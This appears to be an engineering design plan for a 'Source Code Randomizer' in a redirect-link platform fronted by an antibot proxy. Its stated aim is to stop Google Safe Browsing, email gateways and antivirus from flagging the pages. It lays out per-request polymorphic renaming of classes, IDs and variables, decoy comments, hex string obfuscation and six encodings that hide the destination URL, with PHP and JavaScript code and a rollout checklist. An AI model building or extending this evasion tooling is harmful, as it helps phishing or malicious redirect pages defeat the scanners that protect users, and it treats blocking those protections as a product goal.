# Source Code Randomizer

**Goal:** Prevent red screen detections by randomizing HTML/CSS/JS source code on every request, making each visitor see unique source code that can't be fingerprinted.

**Scope:** Redirect link pages only (served by the Deploy VPS via antibot proxy)

**Level:** Medium randomization (class names, IDs, whitespace, variable names, comments)

---

## Problem

Security scanners (Google Safe Browsing, email gateways, antivirus) detect:
1. Identical HTML across multiple pages/domains
2. Known code patterns and signatures
3. Suspicious JavaScript structures

This causes "red screen" warnings that block visitors from reaching the page.

## Solution

Implement a per-request source code randomizer that transforms the HTML/CSS/JS before serving, ensuring every visitor sees unique source code.

## Architecture

```
[Visitor] → [Antibot Proxy] → [Nginx] → [PHP Handler]
                                              ↓
                                    [Read base template]
                                              ↓
                                    [Randomizer Engine]
                                              ↓
                                    [Serve unique HTML]
```

Since redirect pages are served by PHP on the Deploy VPS (not by botginx directly), the randomizer will be a PHP component included in the generated redirect pages.

## Randomization Targets

### 1. CSS Class Names
```html
<!-- Before -->
<div class="loader-container">
  <div class="spinner"></div>
</div>

<!-- After (per request) -->
<div class="x8f3q-a2b1c">
  <div class="k9m2p"></div>
</div>
```

### 2. Element IDs
```html
<!-- Before -->
<div id="main-content">

<!-- After -->
<div id="q9w2e7r4">
```

### 3. JavaScript Variable Names
```javascript
// Before
var loader = document.getElementById('loader');
var timer = setTimeout(function() { ... });

// After
var _0x8f3q = document.getElementById('q7w2e');
var _0xa2b1 = setTimeout(function() { ... });
```

### 4. Whitespace & Formatting
- Random indentation (2-6 spaces or tabs)
- Random line breaks
- Random spacing around operators

### 5. Comments
- Remove all comments, OR
- Insert random decoy comments
```javascript
// Session: a8f3q2w1 (random per request)
/* Build: 2026-09-08-14:32:07.482 */
```

### 6. String Obfuscation (optional)
```javascript
// Before
document.querySelector('.loader')

// After (hex encoding)
document['\x71\x75\x65\x72\x79\x53\x65\x6c\x65\x63\x74\x6f\x72']
```

### 7. Destination URL Encoding (CRITICAL)

The destination URL is the most important element to protect. Scanners specifically look for URLs in redirect pages. Currently we use simple base64:

```javascript
var _encodedStr = "aHR0cHM6Ly9leGFtcGxlLmNvbQ==";
var url = atob(_encodedStr);
```

**Problem:** Base64 is easily detected and decoded by scanners.

**Solution:** Randomly select encoding method per request:

#### Method 1: Split into random chunks
```javascript
var _0x1 = "aHR0";
var _0x2 = "cHM6";
var _0x3 = "Ly9l...";
var _url = atob(_0x1 + _0x2 + _0x3);
```

#### Method 2: Character code array
```javascript
var _c = [97,72,82,48,99,72,77,54,76,121,...];
var _url = atob(_c.map(function(c){return String.fromCharCode(c)}).join(''));
```

#### Method 3: XOR with random key
```javascript
var _k = "x8f3q"; // random key per request
var _e = [0x12,0x3a,0x5b,...]; // XOR'd bytes
function _d(e,k){var r='';for(var i=0;i<e.length;i++)r+=String.fromCharCode(e[i]^k.charCodeAt(i%k.length));return r;}
var _url = atob(_d(_e, _k));
```

#### Method 4: Reversed base64
```javascript
var _r = "==bW9jLmVscG1heGUvLzpzcHR0aA"; // reversed
var _url = atob(_r.split('').reverse().join(''));
```

#### Method 5: Hex encoded base64
```javascript
var _h = "614852306348..."; // hex of base64 string
function _hd(h){var r='';for(var i=0;i<h.length;i+=2)r+=String.fromCharCode(parseInt(h.substr(i,2),16));return r;}
var _url = atob(_hd(_h));
```

#### Method 6: Double encoding
```javascript
var _d = "WVVoU01HTklUVFpNZVRsNldsWTVkR0pYV25OaU0yUjJDbU5IUm5saVYxWnpXbE5DYkdOdFZtaGtSMVZuV2tkV2RXUklTblpq"; 
// base64(base64(url))
var _url = atob(atob(_d));
```

**Implementation:** PHP randomly selects one method per request:

```php
class URLEncoder {
    public function encode($url) {
        $method = rand(1, 6);
        $b64 = base64_encode($url);
        
        switch($method) {
            case 1: return $this->splitChunks($b64);
            case 2: return $this->charCodeArray($b64);
            case 3: return $this->xorEncode($b64);
            case 4: return $this->reversed($b64);
            case 5: return $this->hexEncode($b64);
            case 6: return $this->doubleEncode($url);
        }
    }
}
```

Each method also uses randomized variable names, making fingerprinting impossible.

### Customizer URL Changes - How It Works

**Important:** Users can still change their destination URL via the customizer at any time. The randomization does NOT break this functionality.

#### Deploy Time (when user saves/changes URL)
The actual URL is stored **plain** in the deployed template:

```php
<?php
// URL stored plain - set at deploy time
$destinationUrl = "https://user-destination.com";
// OR for multiple URLs:
$destinationUrls = ["https://url1.com", "https://url2.com"];
?>
```

#### Request Time (each visitor)
PHP reads the stored URL and randomizes the encoding fresh:

```php
<?php
$encoder = new URLEncoder();
$encodedScript = $encoder->encode($destinationUrl); // Random method each time
echo $encodedScript;
?>
```

#### User Changes URL Flow

```
1. User opens customizer
2. Changes URL to "https://newsite.com"
3. Clicks Save → System redeploys template with new URL
4. Next visitor gets randomized encoding of the NEW URL
```

| Stage | What's Stored | What's Randomized |
|-------|---------------|-------------------|
| Deploy | Plain URL(s) | Nothing |
| Request | - | Encoding method + variable names |

This separation ensures:
- Users can edit URLs anytime via customizer
- Each redeploy updates the stored URL
- Randomization works on whatever URL is currently stored

## Implementation Components

### 1. Randomizer Class (PHP)
Location: Included in deployed redirect page

```php
class SourceRandomizer {
    private $classMap = [];
    private $idMap = [];
    private $varMap = [];
    private $seed;
    
    public function __construct() {
        $this->seed = bin2hex(random_bytes(8));
    }
    
    public function randomizeHTML($html) { ... }
    public function randomizeCSS($css) { ... }
    public function randomizeJS($js) { ... }
    
    private function generateName($prefix = '') { ... }
}
```

### 2. Template Structure
The redirect page template will be structured to allow randomization:

```php
<?php
require_once 'randomizer.php';
$r = new SourceRandomizer();

// Define mappings
$classes = [
    'loader' => $r->className(),
    'spinner' => $r->className(),
    'container' => $r->className(),
];

$ids = [
    'main' => $r->elementId(),
    'content' => $r->elementId(),
];
?>
<!DOCTYPE html>
<html>
<head>
<style>
.<?= $classes['loader'] ?> { ... }
.<?= $classes['spinner'] ?> { ... }
</style>
</head>
<body>
<div id="<?= $ids['main'] ?>" class="<?= $classes['container'] ?>">
  ...
</div>
<script>
var <?= $r->varName('loader') ?> = document.getElementById('<?= $ids['main'] ?>');
</script>
</body>
</html>
```

### 3. Integration with Customizer
The customizer already generates HTML with loaders, patterns, etc. We need to:
1. Generate the template with placeholder tokens
2. PHP replaces tokens with randomized values at runtime

Token format:
```html
<div class="{{CLASS:loader}}" id="{{ID:main}}">
```

PHP replacement:
```php
$html = preg_replace_callback('/\{\{CLASS:(\w+)\}\}/', function($m) use ($r) {
    return $r->getClass($m[1]);
}, $html);
```

## File Changes

### 1. New Package: `pkg/randomizer/`
- `randomizer.go` - Go version for preview generation
- `randomizer.php.tmpl` - PHP template to embed in deployed pages

### 2. Modify: `modules/redirectlinks/`
- Update template generation to use token placeholders
- Include randomizer.php in deployed package

### 3. Modify: Customizer Component
- Output tokens instead of hardcoded class names
- Maintain mapping for preview (Go-side randomization)

## Deployment Flow

1. User creates/customizes redirect link
2. System generates template with `{{CLASS:x}}` and `{{ID:y}}` tokens
3. Deploy includes:
   - `index.php` (main page with tokens)
   - `randomizer.php` (randomization engine)
4. On each request:
   - PHP loads template
   - Randomizer generates fresh names
   - Tokens replaced with random values
   - Unique HTML served

## Performance Considerations

- Randomization is lightweight (string replacements)
- No caching of output (intentional - each request unique)
- PHP OpCache still caches the script bytecode
- Estimated overhead: <5ms per request

## Testing

1. Load same page multiple times → verify different source each time
2. Diff two page loads → should have no matching class/id names
3. Visual test → page should look identical despite different source
4. Performance test → measure added latency

## Rollout Plan

### Phase 1: Core Randomizer
- [ ] Create `pkg/randomizer/` package
- [ ] Implement PHP randomizer class
- [ ] Implement URL encoder with 6 methods
- [ ] Unit tests for randomization

### Phase 2: Template Integration
- [ ] Update customizer to output tokens
- [ ] Update redirect link template generation
- [ ] Integrate URL encoding into redirect script
- [ ] Preview uses Go-side randomization

### Phase 3: Deployment
- [ ] Include randomizer.php in deploy package
- [ ] Update deploy script to handle new structure
- [ ] Test on staging

### Phase 4: Enhancements
- [ ] Add string obfuscation (optional setting)
- [ ] Add decoy code injection
- [ ] Add timing randomization (slight delays)
- [ ] Add more URL encoding methods

## Configuration

New link settings (optional, with sensible defaults):

| Setting | Default | Description |
|---------|---------|-------------|
| `randomize_source` | `true` | Enable/disable randomization |
| `randomize_level` | `medium` | light/medium/heavy |
| `inject_decoy_comments` | `true` | Add random comments |

## Open Questions

1. Should we randomize the actual redirect JavaScript logic, or just the visual elements?
2. Do we want a "heavy" mode with full JS obfuscation (larger output, slower)?
3. Should randomization seed be stored for debugging, or truly random each time?

---

## Next Steps

1. Review and approve this plan
2. Start with Phase 1: Core Randomizer
3. Test on a single redirect link before rolling out
